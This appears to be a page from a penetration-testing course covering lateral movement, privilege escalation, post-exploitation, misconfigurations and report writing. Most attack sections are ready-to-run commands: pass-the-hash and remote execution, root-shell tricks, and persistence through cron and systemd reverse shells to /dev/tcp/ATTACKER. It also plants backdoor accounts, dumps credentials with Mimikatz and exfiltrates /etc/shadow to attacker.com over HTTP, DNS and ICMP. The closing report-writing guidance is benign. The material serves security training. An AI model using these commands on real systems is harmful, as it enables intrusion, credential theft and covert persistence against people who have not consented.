LATERAL MOVEMENT

OFFENSIVE

Lateral movement is the phase where an attacker — already holding a foothold on one machine — moves horizontally through the network to reach higher-value targets. The goal is to avoid detection while expanding access. Blue teamers: this is the phase your SIEM should catch.

ATT&CK Tactic: TA0008 — Lateral Movement. Techniques include T1021 (Remote Services), T1550 (Use Alternate Auth Material), T1570 (Lateral Tool Transfer).

🔑 Pass-the-Hash (PtH)

NTLM authentication uses a password hash, not the plaintext password. If you steal the hash, you can authenticate as that user without ever cracking it.

Pass-the-Hash with CrackMapExec WINDOWS 
# Dump hashes from compromised host first
mimikatz # sekurlsa::logonpasswords

# Use hash to auth to another machine (no password needed)
crackmapexec smb 192.168.1.0/24 \
  -u Administrator \
  -H aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c \
  --exec-method smbexec \
  -x "whoami"

# With impacket
impacket-psexec Administrator@192.168.1.10 \
  -hashes :8846f7eaee8fb117ad06bdd830b7586c

🖥️ PsExec / SMB Execution

PsExec creates a service on the remote host and executes commands through it. Requires admin shares (ADMIN$) to be accessible.

Remote Execution via SMB WINDOWS 
# Impacket PsExec (spawns SYSTEM shell)
impacket-psexec domain/user:password@192.168.1.10

# SMBExec (no binary upload, lower footprint)
impacket-smbexec domain/user:password@192.168.1.10

# Verify SMB access first
crackmapexec smb 192.168.1.10 -u user -p password

🖥️ RDP Hijacking

If RDP is enabled and you have SYSTEM privileges, you can hijack an existing disconnected RDP session — no credentials required.

RDP Session Hijacking WINDOWS (SYSTEM required) 
# List active/disconnected sessions
query session

# Hijack session ID 2 (must be SYSTEM)
tscon 2 /dest:rdp-tcp#0

# Enable RDP via registry if disabled
reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" \
  /v fDenyTSConnections /t REG_DWORD /d 0 /f

⚡ WMI & WinRM

Remote Code Execution via WMI / WinRM WINDOWS 
# WMI remote execution (port 135)
impacket-wmiexec domain/user:password@192.168.1.10

# WinRM with Evil-WinRM (port 5985)
evil-winrm -i 192.168.1.10 -u Administrator -p password
# or with hash
evil-winrm -i 192.168.1.10 -u Administrator -H NTLMHASH

🔀 SSH Pivoting / Port Forwarding

Tunneling through compromised hosts LINUX 
# Local port forward: reach internal RDP via compromised host
ssh -L 3389:10.10.10.5:3389 user@compromised-host

# Dynamic SOCKS proxy (route all traffic through pivot)
ssh -D 1080 user@compromised-host
# then: proxychains nmap -sT 10.10.10.0/24

# Reverse tunnel (call home from inside network)
ssh -R 4444:localhost:22 attacker@your-vps
Technique MITRE ID Protocol Requires
Pass-the-Hash T1550.002 NTLM/SMB NTLM hash, admin rights on target
PsExec T1021.002 SMB ADMIN$ share access
WMI Exec T1047 DCOM/RPC Admin credentials, port 135
RDP T1021.001 RDP Credentials or session hijack (SYSTEM)
WinRM/Evil-WinRM T1021.006 HTTP/HTTPS WinRM enabled, admin creds or hash
SSH Tunneling T1572 SSH SSH access to pivot host

PRIVILEGE ESCALATION

OFFENSIVE

PrivEsc is about going from a low-privileged shell to root (Linux) or SYSTEM/Domain Admin (Windows). Every engagement needs it — initial access rarely lands you as admin.

🐧
Linux PrivEsc
SUID bits, sudo misconfig, cron jobs, writable /etc/passwd, kernel exploits, capabilities
🪟
Windows PrivEsc
Token impersonation (Potato attacks), service misconfigs, AlwaysInstallElevated, DLL hijacking, unquoted service paths
🔍
Enumeration First
LinPEAS / WinPEAS automate 90% of the discovery. Run them first, then investigate findings manually.

🔍 Enumeration Tools

Automated PrivEsc Enumeration LINUX 
# LinPEAS — comprehensive Linux enumeration
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | bash

# LinEnum
./LinEnum.sh -t -r report.txt

# Manual quick checks
sudo -l                          # what can this user sudo?
find / -perm -4000 2>/dev/null  # SUID binaries
crontab -l && cat /etc/crontab  # cron jobs
cat /etc/passwd                  # writable? world-readable hashes?
Windows PrivEsc Enumeration WINDOWS 
# WinPEAS
.\winPEAS.exe

# Manual checks
whoami /priv               # check SeImpersonatePrivilege etc.
systeminfo                 # OS version for kernel exploits
sc query                   # list services
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
                           # AlwaysInstallElevated?

🔴 SUID Abuse (Linux)

SUID (Set User ID) binaries run with the owner's privileges (often root). If a SUID binary can be abused to execute commands, you get root.

SUID exploitation via GTFOBins LINUX 
# Find SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Example: SUID bash
/bin/bash -p   # -p preserves EUID = root shell!

# Example: SUID find
find . -exec /bin/bash -p \; -quit

# Example: SUID vim
vim -c ':!/bin/bash -p'

# Linux capabilities (similar to SUID, stealthier)
getcap -r / 2>/dev/null
# python3 with cap_setuid+ep → python3 -c "import os; os.setuid(0); os.system('/bin/bash')"

⚙️ Sudo Misconfiguration

Abusing sudo rules LINUX 
# Check what you can run as sudo
sudo -l

# If: (ALL) NOPASSWD: /usr/bin/vim
sudo vim -c ':!/bin/bash'

# If: (ALL) NOPASSWD: /usr/bin/python3 /opt/script.py
# and you can write to the script:
echo 'import os; os.system("/bin/bash")' >> /opt/script.py
sudo python3 /opt/script.py

# LD_PRELOAD trick (if env_keep += LD_PRELOAD in sudoers)
# create malicious .so, then: sudo LD_PRELOAD=/tmp/evil.so program

🪙 Token Impersonation (Windows)

If you have SeImpersonatePrivilege (common on IIS/service accounts), you can impersonate SYSTEM using Potato attacks.

Potato Attacks — SeImpersonatePrivilege → SYSTEM WINDOWS 
# Check privilege (look for SeImpersonatePrivilege Enabled)
whoami /priv

# PrintSpoofer (Windows 10 / Server 2019)
.\PrintSpoofer64.exe -i -c powershell.exe

# GodPotato (universal)
.\GodPotato.exe -cmd "cmd /c whoami"

# JuicyPotato (older systems)
.\JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe \
  -t * -c {CLSID}

03

POST-EXPLOITATION

PHASE 3

You're in. You're root. Now what? Post-exploitation is about maximizing the value of your access: maintain persistence, dump credentials, map the environment, and exfiltrate data — while staying undetected.

🔒 Persistence

Persistence ensures you maintain access even after reboots, password changes, or detection events.

Linux Persistence Techniques LINUX 
# 1. Add SSH authorized key
echo "ssh-rsa AAAA...yourpubkey..." >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys

# 2. Cron job (reverse shell every minute)
(crontab -l 2>/dev/null; echo "* * * * * /bin/bash -i >& /dev/tcp/ATTACKER/4444 0>&1") | crontab -

# 3. Backdoor /etc/passwd (add root user)
echo 'backdoor:$1$salt$hashedpassword:0:0:root:/root:/bin/bash' >> /etc/passwd

# 4. Systemd service
cat > /etc/systemd/system/update.service << EOF
[Service]
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'
[Install]
WantedBy=multi-user.target
EOF
systemctl enable update.service
Windows Persistence Techniques WINDOWS 
# 1. Registry Run Key
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run \
  /v Update /t REG_SZ /d "C:\Users\Public\backdoor.exe"

# 2. Scheduled Task
schtasks /create /tn "WindowsUpdate" /tr "C:\Temp\shell.exe" \
  /sc onlogon /ru SYSTEM

# 3. Create new local admin
net user backdoor P@ssw0rd /add
net localgroup administrators backdoor /add

🗝️ Credential Dumping

Extracting credentials — Windows WINDOWS 
# Mimikatz — dump all plaintext + hashes from LSASS
mimikatz
privilege::debug
sekurlsa::logonpasswords   # plaintext passwords (if WDigest enabled)
sekurlsa::wdigest          # force WDigest creds
lsadump::sam               # SAM database hashes
lsadump::dcsync /user:Administrator   # DCSync attack (from any domain user)

# Dump LSASS remotely (Impacket)
impacket-secretsdump domain/user:pass@192.168.1.10

# From memory dump
pypykatz lsa minidump lsass.dmp
Credential harvesting — Linux LINUX 
# /etc/shadow — crack with John / hashcat
cat /etc/shadow
john --wordlist=/usr/share/wordlists/rockyou.txt shadow.txt

# SSH private keys
find / -name "id_rsa" 2>/dev/null

# Check bash history, config files
cat ~/.bash_history
grep -r "password\|passwd\|secret" /var/www/ 2>/dev/null

# Databases
cat /var/www/html/config.php   # often has DB creds

📡 C2 Frameworks

A Command and Control (C2) framework lets you manage multiple compromised hosts, pivot through them, and run post-ex modules from one interface.

Framework Type Protocol Notes
Metasploit Open source TCP/HTTP/HTTPS Industry standard; Meterpreter agent; tons of modules
Cobalt Strike Commercial HTTP/DNS/SMB Industry gold standard; Beacon agent; teamserver for red teams
Sliver Open source mTLS/WireGuard/DNS Modern CS alternative; multi-platform; implants in Go
Havoc Open source HTTP/HTTPS Modern, clean UI; Demon agent; good evasion
Empire Open source HTTP/HTTPS PowerShell/Python based; post-ex heavy

📤 Data Exfiltration

Exfiltration techniques LINUX / WINDOWS 
# HTTP exfil (simple)
curl -F "file=@/etc/shadow" http://attacker.com/upload

# DNS exfil (stealthy, bypasses firewalls)
cat /etc/passwd | xxd -p | while read line; do
  nslookup $line.attacker.com
done

# Encode + send over ICMP (ultra stealthy)
ping -p $(xxd -p /etc/shadow | head -1) attacker.com

# Windows: Certutil base64 encode for transfer
certutil -encode C:\sensitive.txt C:\encoded.txt

MISCONFIGURATIONS

EXPLOIT

Most real-world breaches don't exploit 0-days — they exploit misconfigurations. Systems installed with defaults, open shares, weak permissions, and exposed services are far more common than unpatched CVEs.

Real World Stat: Misconfigurations account for ~80% of security incidents according to multiple industry reports. This is Blue Team's biggest win opportunity — fix configs before attackers exploit them.

📁 SMB / NFS Misconfigurations

SMB Enumeration & Exploitation WINDOWS/LINUX 
# Enumerate SMB shares (null session)
smbclient -L //192.168.1.10 -N          # anonymous
crackmapexec smb 192.168.1.10 --shares  # with creds

# Connect to share
smbclient //192.168.1.10/SHARE -N

# NFS misconfig — list exports
showmount -e 192.168.1.10

# Mount exposed NFS share
mount -t nfs 192.168.1.10:/home /tmp/nfs

# If no_root_squash is set: you can write as root
# Create SUID binary on the share → execute it on victim

Kerberoasting ACTIVE DIRECTORY 
# Request TGS tickets for SPN accounts
impacket-GetUserSPNs domain.local/user:pass -dc-ip 192.168.1.1 -request

# Crack with hashcat
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt

# AS-REP Roasting (no password needed)
impacket-GetNPUsers domain.local/ -dc-ip 192.168.1.1 \
  -usersfile users.txt -format hashcat -outputfile asrep.txt
hashcat -m 18200 asrep.txt rockyou.txt

REPORT WRITING

PROFESSIONAL

A pentest without a report is just hacking. The report is the deliverable — it's what the client pays for. From today onwards, every challenge gets a professional write-up.

Key Principle: Write for two audiences. The executive summary is for the CEO who doesn't know what SSH is. The technical findings are for the sysadmin who will actually fix things. Both need to understand the risk.

📋 Professional Report Structure

01  Cover Page & Metadata ▼
  • Title: Penetration Test Report — [Target / Engagement Name]
  • Date: Assessment period (start → end)
  • Prepared by: Tester name, organization
  • Classification: CONFIDENTIAL — For Authorized Eyes Only
  • Version: v1.0 (track changes across drafts)
02  Executive Summary ▼

Written for non-technical stakeholders. 1–2 pages max.

  • Scope: What was tested and what was out of scope
  • Objective: What the test aimed to accomplish
  • Overall Risk Rating: Critical / High / Medium / Low
  • Key Findings Summary: "3 Critical, 5 High, 8 Medium findings were identified"
  • Narrative: What an attacker could realistically do (plain English)
  • Top Recommendations: 3–5 highest priority fixes
03  Methodology ▼
  • Framework used: PTES, OWASP, MITRE ATT&CK
  • Phases: Reconnaissance → Scanning → Exploitation → Post-Exploitation → Reporting
  • Tools used (list them)
  • Testing type: Black box / Gray box / White box
  • Timeline of key activities
04  Technical Findings (Per Vulnerability) ▼

Each finding gets its own structured entry:

FieldDescription
Finding IDVULN-001, VULN-002...
TitleShort descriptive name (e.g., "Unauthenticated RCE via Log4Shell")
SeverityCRITICAL HIGH MEDIUM LOW INFO
CVSS Scoree.g., 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
Affected AssetIP, hostname, URL, component
DescriptionWhat the vulnerability is and why it exists
ImpactWhat an attacker can do with this (business impact)
Proof of ConceptStep-by-step reproduction with screenshots
RemediationSpecific, actionable fix (not just "patch the server")
ReferencesCVE numbers, CWE, vendor advisories
05  Appendices ▼
  • Full command outputs / raw scan results
  • Tool configurations
  • Network diagrams
  • Attack chain visualization
  • Remediation tracker (table of all findings + status)

📊 CVSS Scoring Basics

CVSS v3.1 gives a numeric score to a vulnerability. Learn to calculate it — you'll use it in every report.

Metric Options What it measures
Attack Vector (AV) Network / Adjacent / Local / Physical How remote the attacker can be
Attack Complexity (AC) Low / High How hard is the attack to pull off?
Privileges Required (PR) None / Low / High What auth does the attacker need?
User Interaction (UI) None / Required Does the victim need to click something?
Confidentiality (C) None / Low / High Data disclosure impact
Integrity (I) None / Low / High Data modification impact
Availability (A) None / Low / High Service disruption impact
Score Ranges: 0.0 = None · 0.1–3.9 = Low · 4.0–6.9 = Medium · 7.0–8.9 = High · 9.0–10.0 = Critical

```
tool args
```
Output / screenshot: [describe what you saw]

### Step 2 — [action]

## 4. Proof of Exploitation
Screenshot or output showing you got the flag / root / objective.
Flag: `FLAG{...}` (redacted in public write-ups if contest ongoing)
